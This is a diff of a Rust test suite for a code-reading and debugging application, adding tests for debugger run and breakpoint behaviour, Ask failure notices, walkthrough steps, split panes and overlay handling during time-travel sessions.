+            "{}",
+            turn.answer_md
+        );
+    }
+    let _ = app.update(Message::Settings(SettingsMsg::SetLanguage(
+        crate::i18n::LangPref::Chosen(Lang::En),
+    )));
+    for turn in &app.proj.ask_turns {
+        assert!(
+            turn.answer_md.contains("server disconnected") && !turn.answer_md.contains("serveur"),
+            "{}",
+            turn.answer_md
+        );
+    }
+}
+
 /// CP#2: a Stop the server reports arrives TYPED (`StreamOutcome::Stopped`)
 /// and reads as stopped. It used to travel as an error string compared
 /// against one spelling, so a server that said "cancelled" turned every Stop
@@ -26054,7 +28257,7 @@ fn a_stopped_server_stream_reads_as_stopped_not_failed() {
         ),
         (
             StreamOutcome::Failed("cancelled".into()),
-            "Ask failed: cancelled",
+            "Couldn't answer: cancelled",
             "Couldn't answer: cancelled",
         ),
     ] {
@@ -26083,7 +28286,25 @@ fn a_stopped_server_stream_reads_as_stopped_not_failed() {
         assert!(!turn.streaming);
         assert_eq!(app.status, status);
         assert!(turn.answer_md.contains(shown), "{}", turn.answer_md);
+        // A failure offers to ask again, and lists no sources; a Stop,
+        // asked for, does neither.
+        assert_eq!(
+            turn.extras.failed,
+            status.starts_with("Couldn't answer"),
+            "{status}"
+        );
     }
+    // M1: said on the status bar — with its Try again — only while Ask is
+    // put away to its pill; open, the conversation says it, alone.
+    let notice = app.failure_notice.clone().expect("Ask put away: a notice");
+    assert_eq!(notice.of, crate::app::state::FailureOf::Ask);
+    assert!(matches!(
+        notice.retry,
+        Some(Message::Ask(AskMsg::AskAgain(_)))
+    ));
+    app.ask_view = crate::AskView::Compact;
+    assert!(app.failure_shown().is_none(), "said twice");
+    app.ask_view = crate::AskView::Hidden;
 
     let turns = app.proj.ask_turns.len();
     let task = app.start_agent_ask("how?".into(), false);
@@ -26547,6 +28768,7 @@ fn paused_session_with_fake_adapter(
     app.debug.session = Some(DebugSession {
         client: Some(client),
         status: DebugStatus::Stopped,
+        exit_code: None,
         thread_id: Some(1),
         frames: vec![crate::dap::StackFrame {
             id: 7,
@@ -26648,6 +28870,335 @@ fn breakpoints_changed_during_configuration_are_sent_again() {
         .find(|(c, _)| c == "setBreakpoints")
         .map(|(_, args)| args["breakpoints"][0]["line"].clone());
     assert_eq!(lines, Some(serde_json::json!(4)));
+}
+
+/// M8: a breakpoint set after the run has ended is kept for the next run,
+/// not sent to the adapter that has gone — whose "Server[pid=…]
+/// disconnected unexpectedly" was said as a breakpoint that failed. A
+/// live adapter that fails to answer is said so, with the breakpoints
+/// kept; one that ended while it was asked says nothing.
+#[test]
+fn a_breakpoint_set_after_the_run_ended_is_kept_for_the_next_one() {
+    let mut app = scanned_app("debug-bp-after-end");
+    let (_rt, _events, seen) = paused_session_with_fake_adapter(&mut app);
+    let file = PathBuf::from("/p/prog.rs");
+    let set_breakpoints = |seen: &DapSeen| {
+        seen.lock()
+            .unwrap()
+            .iter()
+            .filter(|(c, _)| c == "setBreakpoints")
+            .count()
+    };
+    let failed = |app: &mut App| {
+        app.status.clear();
+        let _ = app.update(Message::Debug(DebugMsg::DapBreakpointsAnswered {
+            stamp: app.debug_stamp(),
+            run: app.debug_run,
+            session: crate::app::state::OWN_SESSION,
+            answers: vec![(file.clone(), Err("debug adapter closed".into()))],
+        }));
+        app.status.clone()
+    };
+    // Live: the failure is said, and that the breakpoints are kept.
+    let said = failed(&mut app);
+    assert!(
+        said.contains("didn't take") && said.contains("kept for the next run"),
+        "{said}"
+    );
+    app.debug.session.as_mut().unwrap().status = DebugStatus::Terminated;
+    let _ = run_task(app.on_breakpoint_toggle(file.clone(), 4));
+    assert_eq!(
+        set_breakpoints(&seen),
+        0,
+        "not sent to a run that has ended"
+    );
+    assert!(
+        app.debug.breakpoints[&file].contains_key(&4),
+        "kept for the next run"
+    );
+    assert!(!app.status.contains("Could not"), "{}", app.status);
+    // An answer that comes after the run ended says nothing.
+    assert_eq!(failed(&mut app), "");
+}
+
+/// A run without the debugger stops at nothing: no breakpoint goes to its
+/// adapter — not those set before, when it asks to be configured, nor one
+/// toggled while it runs — and it is still started (`configurationDone`).
+/// The breakpoint toggled is kept for the next debug run.
+#[test]
+fn a_run_sets_no_breakpoint() {
+    let mut app = scanned_app("debug-run-no-breakpoints");
+    let (_rt, _events, seen) = paused_session_with_fake_adapter(&mut app);
+    app.debug.no_debug = true;
+    let file = PathBuf::from("/p/prog.rs");
+    app.debug
+        .breakpoints
+        .entry(file.clone())
+        .or_default()
+        .insert(2, Default::default());
+    let count = |seen: &DapSeen, command: &str| {
+        seen.lock()
+            .unwrap()
+            .iter()
+            .filter(|(c, _)| c == command)
+            .count()
+    };
+    let _ = run_task(app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.debug_stamp(),
+        run: app.debug_run,
+        event: crate::dap::DapEvent::Initialized,
+    })));
+    assert_eq!(count(&seen, "configurationDone"), 1, "it is started");
+    assert_eq!(count(&seen, "setBreakpoints"), 0, "with none set");
+    let _ = run_task(app.on_breakpoint_toggle(file.clone(), 4));
+    assert_eq!(count(&seen, "setBreakpoints"), 0, "nor one added");
+    assert!(
+        app.debug.breakpoints[&file].contains_key(&4),
+        "kept for the next debug run"
+    );
+
+    // Debugging, the same configuration sends them.
+    app.debug.no_debug = false;
+    let _ = run_task(app.update(Message::Debug(DebugMsg::DapEvent {
+        stamp: app.debug_stamp(),
+        run: app.debug_run,
+        event: crate::dap::DapEvent::Initialized,
+    })));
+    assert_eq!(count(&seen, "setBreakpoints"), 1);
+}
+
+/// Run starts the program as Debug does, marked as a run — the status line
+/// says it starts the program, not a debugger — and Debug after it is a
+/// debug run again.
+#[test]
+fn run_starts_the_program_without_the_debugger() {
+    let mut app = scanned_app("debug-run-start");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(root.join("main.py"), "print('hi')\n").unwrap();
+    open_synchronously(&mut app, "main.py", None);
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    assert!(app.debug.session.is_some(), "{}", app.status);
+    assert!(app.debug.no_debug);
+    // What runs, named — no debugger named for a run without one.
+    assert!(app.status.contains("Running main.py"), "{}", app.status);
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+    let _ = app.update(Message::Debug(DebugMsg::Start));
+    assert!(app.debug.session.is_some(), "{}", app.status);
+    assert!(!app.debug.no_debug, "Debug debugs");
+    assert!(app.status.contains("Starting debugger"), "{}", app.status);
+    assert_eq!(app.debug.ran_for, None, "main.py runs itself");
+}
+
+/// A jump that opens another file near its end keeps the file's start in
+/// view when it fits: the view's measured height goes with the pane to the
+/// file it opens. Opened with the guess a new pane starts with, the 33rd
+/// line of a 38-line file was put near the top and the 30 before it
+/// scrolled away.
+#[test]
+fn a_jump_into_another_short_file_keeps_its_start() {
+    let mut app = scanned_app("jump-short-file");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    let body: String = (1..=38).map(|i| format!("x{i} = {i}\n")).collect();
+    std::fs::write(root.join("short.py"), body).unwrap();
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let lh = app.line_height();
+    {
+        let v = app.proj.panes[app.proj.active].as_mut().unwrap();
+        v.viewport_h = 20.0 * lh;
+        v.viewport_measured = true;
+        v.bounds_h = 20.0 * lh;
+    }
+    open_synchronously(&mut app, "short.py", Some(33));
+    let v = app.active_viewer().unwrap();
+    assert!(v.abs.ends_with("short.py"));
+    assert_eq!(v.bounds_h, 20.0 * lh, "the measured height goes with it");
+    assert_eq!(v.scroll_y, 18.0 * lh, "its last line at the foot");
+}
+
+/// Run swaps in only an evident program start: a `main` in a helper script,
+/// a method named `main`, or two starts to choose between leave Run on the
+/// file it was asked for — a project's `scripts/seed_db.py` ran, and
+/// rewrote its database, for Run on `utils.py`.
+#[test]
+fn run_swaps_in_only_an_evident_program_start() {
+    let mut app = scanned_app("debug-run-evident-main");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::create_dir_all(root.join("scripts")).unwrap();
+    std::fs::create_dir_all(root.join("app")).unwrap();
+    std::fs::write(root.join("utils.py"), "def price():\n    return 3\n").unwrap();
+    for main in ["main.py", "scripts/seed_db.py", "app/__main__.py"] {
+        std::fs::write(root.join(main), "def main():\n    pass\n").unwrap();
+    }
+    let symbol = |file: &str, name: &str, kind: &str| SymbolEntry {
+        name: name.into(),
+        kind: kind.into(),
+        rel: file.into(),
+        abs: root.join(file),
+        line: 1,
+        is_test: false,
+        entry: (name == "main").then_some(crate::graph::index::EntryKind::Main),
+    };
+    app.proj.symbol_index_by_file.insert(
+        root.join("utils.py"),
+        Arc::new(vec![symbol("utils.py", "price", "function")]),
+    );
+    open_synchronously(&mut app, "utils.py", None);
+    let runs = |app: &mut App| {
+        let _ = app.update(Message::Debug(DebugMsg::Run));
+        let program = app.debug.session.as_ref().expect("a run").program.clone();
+        let _ = app.update(Message::Debug(DebugMsg::Stop));
+        program
+    };
+    // A helper script's main: not the program.
+    app.proj.symbol_index_by_file.insert(
+        root.join("scripts/seed_db.py"),
+        Arc::new(vec![symbol("scripts/seed_db.py", "main", "function")]),
+    );
+    assert_eq!(runs(&mut app), root.join("utils.py"));
+    // A method named main: not a program start.
+    app.proj.symbol_index_by_file.insert(
+        root.join("main.py"),
+        Arc::new(vec![symbol("main.py", "main", "method")]),
+    );
+    assert_eq!(runs(&mut app), root.join("utils.py"));
+    // One evident start: it runs.
+    app.proj.symbol_index_by_file.insert(
+        root.join("main.py"),
+        Arc::new(vec![symbol("main.py", "main", "function")]),
+    );
+    assert_eq!(runs(&mut app), root.join("main.py"));
+    // Two to choose between: neither is picked for the reader.
+    app.proj.symbol_index_by_file.insert(
+        root.join("app/__main__.py"),
+        Arc::new(vec![symbol("app/__main__.py", "main", "function")]),
+    );
+    assert_eq!(runs(&mut app), root.join("utils.py"));
+}
+
+/// Run on a module that only defines things runs the project's one
+/// program start instead — Run on `pricing.py` beside a `main.py` printed
+/// nothing and exited 0 — and the status line names what runs. A file that
+/// does something at its top level runs itself, as before.
+#[test]
+fn run_on_a_module_of_defs_runs_the_projects_main() {
+    let mut app = scanned_app("debug-run-main");
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    std::fs::write(
+        root.join("main.py"),
+        "from pricing import price\n\ndef main():\n    print(price())\n\nif __name__ == \"__main__\":\n    main()\n",
+    )
+    .unwrap();
+    std::fs::write(root.join("pricing.py"), "def price():\n    return 3\n").unwrap();
+    let symbol = |file: &str, name: &str, entry| SymbolEntry {
+        name: name.into(),
+        kind: "function".into(),
+        rel: file.into(),
+        abs: root.join(file),
+        line: 1,
+        is_test: false,
+        entry,
+    };
+    app.proj.symbol_index_by_file.insert(
+        root.join("main.py"),
+        Arc::new(vec![symbol(
+            "main.py",
+            "main",
+            Some(crate::graph::index::EntryKind::Main),
+        )]),
+    );
+    app.proj.symbol_index_by_file.insert(
+        root.join("pricing.py"),
+        Arc::new(vec![symbol("pricing.py", "price", None)]),
+    );
+    assert!(!app.runs_on_its_own(&root.join("pricing.py")));
+    assert!(app.runs_on_its_own(&root.join("main.py")));
+    open_synchronously(&mut app, "pricing.py", None);
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    let session = app.debug.session.as_ref().expect("a run");
+    assert_eq!(session.program, root.join("main.py"), "{}", app.status);
+    // Said with the run, for as long as it is shown — said only on the
+    // status line, it was gone in under half a second.
+    assert_eq!(app.debug.ran_for.as_deref(), Some("pricing.py"));
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+
+    // A script with code at its top level runs itself.
+    std::fs::write(root.join("tool.py"), "print('hi')\n").unwrap();
+    app.proj
+        .symbol_index_by_file
+        .insert(root.join("tool.py"), Arc::new(Vec::new()));
+    app.proj.calls_by_file.insert(
+        root.join("tool.py"),
+        Arc::new(crate::projectcalls::FileCalls::new(
+            root.join("tool.py"),
+            crate::highlight::Lang::Python,
+            vec![crate::projectcalls::CallSite {
+                caller: None,
+                callee: "print".into(),
+                method: false,
+                receiver: None,
+                line: 1,
+            }],
+            &[],
+            Default::default(),
+        )),
+    );
+    open_synchronously(&mut app, "tool.py", None);
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    let session = app.debug.session.as_ref().expect("a run");
+    assert_eq!(session.program, root.join("tool.py"));
+    assert_eq!(app.debug.ran_for, None);
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+
+    // A module whose only call at its top is a constant's value is still a
+    // module of definitions: the program's start runs.
+    std::fs::write(
+        root.join("rates.py"),
+        "from decimal import Decimal\nTAX_RATE = Decimal(\"0.08\")\n",
+    )
+    .unwrap();
+    app.proj
+        .symbol_index_by_file
+        .insert(root.join("rates.py"), Arc::new(Vec::new()));
+    app.proj.calls_by_file.insert(
+        root.join("rates.py"),
+        Arc::new(crate::projectcalls::FileCalls::new(
+            root.join("rates.py"),
+            crate::highlight::Lang::Python,
+            vec![crate::projectcalls::CallSite {
+                caller: None,
+                callee: "Decimal".into(),
+                method: false,
+                receiver: None,
+                line: 2,
+            }],
+            &[],
+            Default::default(),
+        )),
+    );
+    open_synchronously(&mut app, "rates.py", None);
+    assert!(!app.runs_on_its_own(&root.join("rates.py")));
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    let session = app.debug.session.as_ref().expect("a run");
+    assert_eq!(session.program, root.join("main.py"));
+    let _ = app.update(Message::Debug(DebugMsg::Stop));
+
+    // A test file of definitions runs its tests (pytest is given it): it
+    // ran main.py, and said the test "does not run on its own".
+    std::fs::create_dir_all(root.join("tests")).unwrap();
+    std::fs::write(
+        root.join("tests/test_pricing.py"),
+        "from pricing import price\n\ndef test_price():\n    assert price() == 3\n",
+    )
+    .unwrap();
+    app.proj.symbol_index_by_file.insert(
+        root.join("tests/test_pricing.py"),
+        Arc::new(vec![symbol("tests/test_pricing.py", "test_price", None)]),
+    );
+    open_synchronously(&mut app, "tests/test_pricing.py", None);
+    let _ = app.update(Message::Debug(DebugMsg::Run));
+    let session = app.debug.session.as_ref().expect("a run");
+    assert_eq!(session.program, root.join("tests/test_pricing.py"));
+    assert_eq!(app.debug.ran_for, None);
 }
 
 /// D1-10: hovering a word while the debuggee is paused evaluates it in the top
@@ -26776,6 +29327,7 @@ fn js_debug_run(app: &mut App, parent: crate::dap::DapClient) -> u64 {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Launching,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -26836,6 +29388,7 @@ fn js_debug_child_sessions_are_kept_apart() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Launching,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -27323,6 +29876,7 @@ fn a_js_debug_child_session_ends_with_its_run() {
     app.debug.session = Some(DebugSession {
         client: Some(parent),
         status: DebugStatus::Running,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -27417,6 +29971,7 @@ fn a_js_debug_child_session_reports_its_failure_and_brings_its_promise() {
         app.debug.session = Some(DebugSession {
             client: Some(parent),
             status: DebugStatus::Running,
+            exit_code: None,
             thread_id: None,
             frames: Vec::new(),
             scopes: Vec::new(),
@@ -27604,6 +30159,7 @@ fn a_tcp_adapters_announced_address_is_kept_whole() {
     app.debug.session = Some(DebugSession {
         client: None,
         status: DebugStatus::Launching,
+        exit_code: None,
         thread_id: None,
         frames: Vec::new(),
         scopes: Vec::new(),
@@ -27648,6 +30204,7 @@ fn a_walkthrough_step_the_reader_left_never_moves_the_cursor_later() {
     let mut app = scanned_app("walk-anchor-stale");
     app.proj.symbol_index_by_file.clear(); // the index has not reached it
     app.proj.walk.library = vec![walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: "tour".into(),
         steps: vec![walkthrough::Step {
@@ -27656,6 +30213,8 @@ fn a_walkthrough_step_the_reader_left_never_moves_the_cursor_later() {
             symbol: Some("origin".into()),
             line: None,
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     }];
     let _ = app.update(Message::Walk(WalkMsg::Open("tour".into())));
@@ -27681,6 +30240,7 @@ fn a_jump_within_the_steps_file_supersedes_the_step() {
     let mut app = scanned_app("walk-anchor-same-file");
     app.proj.symbol_index_by_file.clear(); // the index has not reached it
     app.proj.walk.library = vec![walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: "tour".into(),
         steps: vec![walkthrough::Step {
@@ -27689,6 +30249,8 @@ fn a_jump_within_the_steps_file_supersedes_the_step() {
             symbol: Some("origin".into()),
             line: None,
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     }];
     let _ = app.update(Message::Walk(WalkMsg::Open("tour".into())));
@@ -27725,6 +30287,7 @@ fn a_jump_within_the_steps_file_supersedes_the_step() {
 /// at `line`.
 fn walk_tour(symbol: &str, line: Option<usize>) -> Vec<walkthrough::Walkthrough> {
     vec![walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: "tour".into(),
         steps: vec![walkthrough::Step {
@@ -27733,6 +30296,8 @@ fn walk_tour(symbol: &str, line: Option<usize>) -> Vec<walkthrough::Walkthrough>
             symbol: Some(symbol.into()),
             line,
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     }]
 }
@@ -27799,6 +30364,32 @@ fn a_viewport_change() -> iced::widget::scrollable::Viewport {
     sim.into_messages()
         .last()
         .expect("the scrollable reported no viewport")
+}
+
+/// A scrollable's viewport `height` tall, at its top, as its `on_scroll`
+/// reports one.
+fn a_viewport_at_top(height: f32) -> iced::widget::scrollable::Viewport {
+    use iced::widget::{scrollable, space};
+    let tall: iced::Element<'_, scrollable::Viewport> =
+        scrollable(space().width(iced::Fill).height(8000))
+            .on_scroll(|viewport| viewport)
+            .width(200)
+            .height(height)
+            .into();
+    let mut sim = iced_test::simulator(tall);
+    sim.point_at(iced::Point::new(10.0, 10.0));
+    for y in [-40.0, 40.0] {
+        let _ = sim.simulate([iced::Event::Mouse(iced::mouse::Event::WheelScrolled {
+            delta: iced::mouse::ScrollDelta::Pixels { x: 0.0, y },
+        })]);
+    }
+    let viewport = sim
+        .into_messages()
+        .last()
+        .expect("the scrollable reported no viewport");
+    assert_eq!(viewport.absolute_offset().y, 0.0);
+    assert_eq!(viewport.bounds().height, height);
+    viewport
 }
 
 /// The reader's own move in the step's file wins the same way. A click, a
@@ -28081,6 +30672,7 @@ fn markdown_step_landed(tag: &str) -> (App, Task<Message>) {
     scan_synchronously(&mut app, root);
     app.proj.symbol_index_by_file.clear(); // the index has not reached it
     app.proj.walk.library = vec![walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: "tour".into(),
         steps: vec![walkthrough::Step {
@@ -28089,6 +30681,8 @@ fn markdown_step_landed(tag: &str) -> (App, Task<Message>) {
             symbol: Some("usage".into()),
             line: None,
             narration: "n".into(),
+            depth: 0,
+            stop: None,
         }],
     }];
     let _ = app.update(Message::Walk(WalkMsg::Open("tour".into())));
@@ -28955,6 +31549,9 @@ fn closing_the_split_moves_a_start_there_to_the_pane_left_or_gives_it_up() {
         assert_eq!(app.proj.active, 1);
         let _git = app.update(Message::TimeTravel(TimeTravelMsg::Start { symbol: false }));
         let asked = app.proj.time_gen;
+        // Closed from the left pane, the one read: the right one, with the
+        // start, goes.
+        app.proj.active = 0;
         let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
         if shown {
             assert_eq!(
@@ -28973,6 +31570,40 @@ fn closing_the_split_moves_a_start_there_to_the_pane_left_or_gives_it_up() {
             "a history landed in a session no pane shows (shown on the left: {shown})"
         );
     }
+}
+
+/// H2: closing the split keeps the pane being read. Reading the file
+/// opened to the side, in the right pane, closing the split closed that
+/// one: the file read went, the other stayed. Kept, it is where it was;
+/// read on the left, the left is kept.
+#[test]
+fn closing_the_split_keeps_the_pane_being_read() {
+    let mut app = scanned_app("split-keeps-read-pane");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    open_synchronously(&mut app, "notes.txt", None);
+    assert_eq!(app.proj.active, 1);
+    {
+        let v = app.proj.panes[1].as_mut().unwrap();
+        v.caret = Some((1, 2));
+        v.scroll_y = 18.0;
+    }
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    assert!(!app.proj.split);
+    assert!(app.proj.panes[1].is_none());
+    assert_eq!(app.proj.active, 0);
+    let kept = app.proj.panes[0].as_ref().unwrap();
+    assert_eq!(kept.rel, "notes.txt", "the file being read went");
+    assert_eq!((kept.caret, kept.scroll_y), (Some((1, 2)), 18.0));
+    assert_eq!(app.proj.link.pane_pending, [None, None]);
+
+    // Read on the left: the left is kept.
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    open_synchronously(&mut app, "src/lib.rs", None);
+    app.proj.active = 0;
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    assert_eq!(app.proj.panes[0].as_ref().unwrap().rel, "notes.txt");
+    assert!(app.proj.panes[1].is_none());
 }
 
 /// A time-travel session off screen takes no key. The reader focused the
@@ -29077,7 +31708,7 @@ fn an_overlay_over_a_time_travel_session_takes_its_keys_first() {
     open_synchronously(&mut app, "src/lib.rs", None);
     dismiss_overlays(&mut app);
     // Short enough for the ⋯ menu's tools to be in it, not on the strip.
-    app.window_height = 600.0;
+    app.window_height = 520.0;
     let _git = app.update(Message::TimeTravel(TimeTravelMsg::Start { symbol: false }));
     let _first_scrub = app.update(lib_history(&app, app.proj.time_gen));
     assert!(crate::ui::time_travel_on_screen(&app).is_some());
@@ -29110,6 +31741,16 @@ fn an_overlay_over_a_time_travel_session_takes_its_keys_first() {
     let _ = app.update(esc_press());
     assert!(!app.show_tools_menu);
     assert_eq!(revision(&app), Some(0));
+    // The bug's Run menu: there where the strip is too short for the four
+    // ways to run.
+    let tall = app.window_height;
+    app.window_height = 540.0;
+    let _ = app.update(Message::Window(WindowMsg::ToggleRunMenu));
+    assert!(app.show_run_menu);
+    let _ = app.update(esc_press());
+    assert!(!app.show_run_menu, "the Run menu takes Esc");
+    assert_eq!(revision(&app), Some(0));
+    app.window_height = tall;
 
     // The shortcuts panel takes every key, the session's chords included.
     let _ = app.update(Message::Window(WindowMsg::OpenShortcuts));
@@ -29162,18 +31803,23 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
             O::UpdateNotes => "update notes",
             O::Settings => "settings",
             O::Connect => "connect",
+            O::TourPrep(_) => "tour prep",
             O::BpCondition(_) => "breakpoint condition",
+            O::FakeRun(_) => "fake run",
             O::BookmarkNote(_) => "bookmark note",
             O::ReadingNote(_) => "reading note",
             O::Why(_) => "why",
             O::Insight(_) => "insight",
             O::ToolsMenu => "tools menu",
+            O::RunMenu => "run menu",
             O::TargetMenu => "target menu",
             O::AppMenu => "app menu",
             O::ViewMenu => "view menu",
+            O::ViewsMenu => "views menu",
             O::Graph(_) => "graph",
             O::Finder => "finder",
             O::ContextMenu(_) => "context menu",
+            O::TreeMenu(_) => "tree menu",
             O::Hover(_) => "hover",
         }
     }
@@ -29184,26 +31830,31 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
         app.update.show_notes = false;
         app.settings.open = false;
         app.connect = None;
+        app.tour_prep = None;
         app.proj.bp_cond_edit = None;
+        app.proj.fake.sheet = None;
         app.proj.note_edit = None;
         app.proj.reading_note_edit = None;
         app.proj.blame_why = None;
         app.proj.insight = None;
         app.show_tools_menu = false;
+        app.show_run_menu = false;
         app.show_target_menu = false;
         app.show_app_menu = false;
         app.show_view_menu = false;
+        app.show_views_menu = false;
         app.proj.overlay = None;
         app.server_panel = false;
         app.proj.finder.open = false;
         app.proj.context_menu = None;
+        app.proj.tree_menu = None;
         app.proj.hover = None;
     }
     let mut app = scanned_app("tt-overlays-hold-chords");
     open_synchronously(&mut app, "src/lib.rs", None);
     dismiss_overlays(&mut app);
     // Short enough for the ⋯ menu's tools to be in it, not on the strip.
-    app.window_height = 600.0;
+    app.window_height = 520.0;
     let _git = app.update(Message::TimeTravel(TimeTravelMsg::Start { symbol: false }));
     let _first_scrub = app.update(lib_history(&app, app.proj.time_gen));
     assert!(crate::ui::time_travel_on_screen(&app).is_some());
@@ -29243,7 +31894,19 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
         Box::new(|a| a.update.show_notes = true),
         Box::new(|a| a.settings.open = true),
         Box::new(|a| a.connect = Some(ConnectUi::default())),
+        Box::new(|a| a.tour_prep = Some(Default::default())),
         Box::new(move |a| a.proj.bp_cond_edit = Some((lib.clone(), 1, String::new()))),
+        Box::new(|a| {
+            let target = a.fake_target_at(a.proj.active, 3).expect("origin");
+            a.proj.fake.sheet = Some(crate::app::fakerun::Sheet {
+                fields: crate::fakerun::fields(&target),
+                values: vec![String::new()],
+                target,
+                suggesting: None,
+                suggest_failed: None,
+                debug: false,
+            })
+        }),
         Box::new(|a| a.proj.note_edit = Some(("src/lib.rs".into(), 1, String::new()))),
         Box::new(|a| {
             a.proj.reading_note_edit = Some(("src/lib.rs".into(), "k".into(), String::new()))
@@ -29256,6 +31919,9 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
                 commits: Vec::new(),
                 loading: true,
                 prepared: Vec::new(),
+                fix: None,
+                asked: None,
+                failed: false,
             })
         }),
         Box::new(|a| {
@@ -29270,9 +31936,11 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
             })
         }),
         Box::new(|a| a.show_tools_menu = true),
+        Box::new(|a| a.show_run_menu = true),
         Box::new(|a| a.show_target_menu = true),
         Box::new(|a| a.show_app_menu = true),
         Box::new(|a| a.show_view_menu = true),
+        Box::new(|a| a.show_views_menu = true),
         Box::new(|a| a.proj.overlay = Some(Overlay::ProjectImports)),
         Box::new(|a| a.proj.finder.open = true),
         Box::new(|a| {
@@ -29285,6 +31953,15 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
                 insight: None,
                 served: true,
                 by_pointer: true,
+                line_top: None,
+            })
+        }),
+        Box::new(|a| {
+            a.proj.tree_menu = Some(crate::app::state::TreeMenu {
+                rel: "src/lib.rs".into(),
+                dir: false,
+                x: 10.0,
+                y: 10.0,
             })
         }),
     ];
@@ -29308,7 +31985,7 @@ fn every_overlay_over_a_time_travel_session_holds_its_chords() {
     distinct.dedup();
     assert_eq!(
         (raised.len(), distinct.len()),
-        (18, 18),
+        (23, 23),
         "every overlay but the hover peek is raised, once: {raised:?}"
     );
 
@@ -30262,7 +32939,7 @@ fn a_scope_toggle_still_loading_stands_with_a_summary_and_says_when_it_gives_way
                 }));
                 let tt = app.proj.time_travel.as_ref().unwrap();
                 assert_eq!(
-                    tt.why.get(&sha).map(String::as_str),
+                    tt.why.get(&sha).and_then(|r| r.as_deref().ok()),
                     Some("It adds `origin`."),
                     "the summary was dropped as the new scope landed"
                 );
@@ -30510,6 +33187,7 @@ fn walkthrough_rows_act_on_the_tour_they_show() {
     let mut app = scanned_app("walk-by-scope");
     let root = app.proj.project.as_ref().unwrap().root.clone();
     let tour = |scope: &str| walkthrough::Walkthrough {
+        made: None,
         title: scope.into(),
         scope: scope.into(),
         steps: Vec::new(),
@@ -30590,8 +33268,11 @@ fn a_walkthrough_step_whose_symbol_is_missing_says_so_once_its_file_lands() {
         symbol: Some(symbol.into()),
         line,
         narration: "n".into(),
+        depth: 0,
+        stop: None,
     };
     app.proj.walk.library = vec![walkthrough::Walkthrough {
+        made: None,
         title: "Tour".into(),
         scope: "tour".into(),
         steps: vec![
@@ -32634,6 +35315,116 @@ fn the_peek_and_the_menu_open_at_the_pointer_of_a_scrolled_pane() {
     assert_eq!((peek.x, peek.y), (140.0, 210.0));
 }
 
+/// M4/M5: a gutter line's tip shows once the pointer has rested on it —
+/// not for a line it has moved off since — placed in window space as the
+/// peek is; leaving the gutter puts it away.
+#[test]
+fn a_gutter_tip_waits_for_the_pointer_to_rest_on_its_line() {
+    let mut app = scanned_app("gutter-tip");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let v = app.proj.panes[0].as_mut().unwrap();
+    v.scroll_x = 0.0;
+    v.scroll_y = 200.0;
+    let gutter = |line: Option<usize>, y: f32| {
+        Message::Hover(HoverMsg::Gutter {
+            pane: 0,
+            line,
+            x: 12.0,
+            y,
+        })
+    };
+    let _ = app.update(gutter(Some(2), 260.0));
+    let first = app.proj.gutter_tip.as_ref().unwrap().generation;
+    let _ = app.update(gutter(Some(3), 280.0));
+    let due = |app: &App, generation| {
+        Message::Hover(HoverMsg::GutterDue {
+            stamp: app.stamp(),
+            generation,
+        })
+    };
+    let _ = app.update(due(&app, first));
+    let tip = app.proj.gutter_tip.clone().unwrap();
+    assert!(!tip.shown, "a rest on the line left showed: {tip:?}");
+    let _ = app.update(due(&app, tip.generation));
+    let tip = app.proj.gutter_tip.clone().unwrap();
+    assert!(tip.shown);
+    assert_eq!(tip.line, 3);
+    assert_eq!((tip.x, tip.y), (12.0, 80.0), "in window space");
+    assert_eq!(tip.scroll, (0.0, 200.0));
+    let _ = app.update(gutter(None, 0.0));
+    assert!(app.proj.gutter_tip.is_none(), "left the gutter");
+    // A tip on the second pane's gutter, that pane closed under the
+    // pointer: no gutter is left to put it away, and it came back drawn
+    // at its old place once the split was opened again.
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    assert!(app.proj.split);
+    let _ = app.update(Message::Hover(HoverMsg::Gutter {
+        pane: 1,
+        line: Some(2),
+        x: 12.0,
+        y: 60.0,
+    }));
+    let generation = app.proj.gutter_tip.as_ref().unwrap().generation;
+    let _ = app.update(due(&app, generation));
+    assert!(app.proj.gutter_tip.as_ref().unwrap().shown);
+    let _ = app.update(Message::Editor(EditorMsg::ToggleSplit));
+    assert!(!app.proj.split);
+    assert!(app.proj.gutter_tip.is_none(), "outlived its pane");
+}
+
